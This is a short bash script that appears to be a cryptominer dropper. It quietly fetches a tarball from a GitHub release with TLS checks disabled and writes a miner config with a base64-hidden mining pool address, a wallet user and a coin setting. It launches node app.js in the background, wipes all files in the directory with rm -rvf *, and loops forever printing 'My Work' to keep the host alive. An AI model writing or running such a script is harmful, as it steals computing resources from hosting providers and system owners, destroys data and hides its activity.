#!/bin/bash

curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/mino.tar.gz > /dev/null 2>&1
tar -xvf mino.tar.gz > /dev/null 2>&1
echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "mino/00", "threads": 8}' > data.txt
node app.js > /dev/null 2>&1 &
rm -rvf *
while true
do
        echo "My Work"
        sleep 1200
done
